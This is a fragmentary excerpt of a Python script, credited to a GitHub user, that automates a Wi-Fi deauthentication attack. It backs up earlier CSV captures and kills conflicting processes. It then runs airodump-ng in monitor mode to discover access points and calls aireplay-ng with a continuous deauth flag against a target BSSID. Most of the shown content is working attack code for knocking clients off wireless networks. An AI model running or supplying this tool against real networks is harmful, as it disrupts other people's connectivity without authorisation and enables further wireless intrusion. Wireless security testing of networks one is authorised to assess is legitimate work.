...
print(r"""
            ...
            ||        | |                             || //
            ||        | |              _              ||//
  ||        /| _____  | |  _ __ _____ (_) _____ ____  ||\\
  \\       // /  _  \ | | | '__`  __ \/ |/_____|    \ || \\
   \\     // /  / \  \| | | |  | |  | | |||    | ()  |||  \\
    \\   //  \  \_/  /| | | |  | |  | | |||____|\___/ ||   \\
     \\_//    \_____/ | | |_|  |_|  |_| |\_____|\___  ||    \\ """)
print("\n****************************************************************")
print("\n* Copyright of Jolmicek, 2021                              *")
print("\n* https://github.com/Jolmicek                               *")
print("\n****************************************************************")
...
for file_name in os.listdir():
    ...
    if ".csv" in file_name:
        ...
        shutil.move(file_name, directory + "/backup/" +
...
kill_confilict_processes = subprocess.run(
...
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1",
                                          "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
...
# The script is the parent process and creates a child process which runs the system command,
# and will only continue once the child process has completed.
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid,
